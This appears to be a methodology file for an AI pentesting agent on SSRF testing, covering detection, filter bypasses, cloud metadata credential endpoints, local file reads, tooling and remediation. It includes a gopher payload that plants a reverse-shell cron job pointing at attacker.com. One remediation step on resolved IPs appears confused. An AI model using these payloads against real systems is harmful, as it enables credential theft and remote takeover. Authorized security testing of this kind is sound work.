---
name: ssrf-testing
description: Specialized skill and methodology for SSRF (Server-Side Request Forgery) testing
version: 1.0.0
---

# SSRF (Server-Side Request Forgery) Testing

## Overview

SSRF (Server-Side Request Forgery) is a vulnerability that abuses a server's ability to make requests, enabling access to internal resources, port scanning, or firewall bypasses. This skill covers detection, exploitation, and remediation of SSRF vulnerabilities.

## Vulnerability Mechanics

The application accepts a URL parameter and requests that URL. An attacker who controls the request target can achieve:
- Internal resource access
- Local file reads
- Port scanning
- Firewall bypasses
- Cloud metadata access

## Testing Methodology

### 1. Identify SSRF Input Points

**Common features:**
- URL previews/screenshots
- File upload (from remote URLs)
- Webhook callbacks
- API proxies
- Data import
- Image processing
- PDF generation

### 2. Basic Detection

**Test local loopback:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Test internal IPs:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Test the file scheme:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Filter Bypass Techniques

**IP address encodings:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hex)
127.0.0.1 → 0177.0.0.1 (octal)
```

**DNS name bypasses:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL redirects:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Scheme confusion:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Exploitation Techniques

### Internal Network Probing

**Port scanning:**
```bash
# Using Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Service detection:**
- Response timing differences
- Error messages
- HTTP status codes
- Response bodies

### Cloud Metadata

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Internal Application Attacks

**Access admin backends:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Unauthenticated Redis access:**
```
http://127.0.0.1:6379
# Then send Redis commands
```

**FastCGI attacks:**
```
http://127.0.0.1:9000
# Execute commands via the FastCGI protocol
```

## Advanced Exploitation

### Gopher Scheme

**Send arbitrary protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict Scheme

**Port scanning and reconnaissance:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File Scheme

**Read local files:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Tool Usage

### SSRFmap

```bash
# Basic scan
python3 ssrfmap.py -r request.txt -p url

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generate a Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detect blind SSRF:**
```
http://burpcollaborator.net
# Watch for inbound DNS/HTTP callbacks
```

## Verification and Reporting

### Verification Steps

1. Confirm the request target is attacker-controllable
2. Verify internal resource access or port scanning
3. Assess the impact scope (internal network compromise, data exposure, etc.)
4. Document a complete PoC
5. Record the confirmed vulnerability in the platform via the `report_finding` tool (the sole entry point for recording vulnerabilities on this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Points

- Vulnerability location and input parameters
- Internal resources or ports reachable through the SSRF
- Full exploitation steps and PoC
- Remediation advice (URL allowlist, restricting dangerous schemes, etc.)

## Remediation Measures

### Recommended Approach

1. **URL allowlist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Restrict dangerous schemes**
   - Allow only http/https
   - Block file://, gopher://, dict://, etc.

3. **IP address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **Validate resolved DNS**
   - Resolve the hostname to an IP
   - Verify the IP falls within the allowed internal range

5. **Network segmentation**
   - Restrict the server's outbound access
   - Route egress through a proxy

## Notes

- Perform testing only in authorized environments
- Avoid disrupting internal systems
- Mind each protocol's support status on the target
- Rate-limit test requests to avoid tripping protective controls
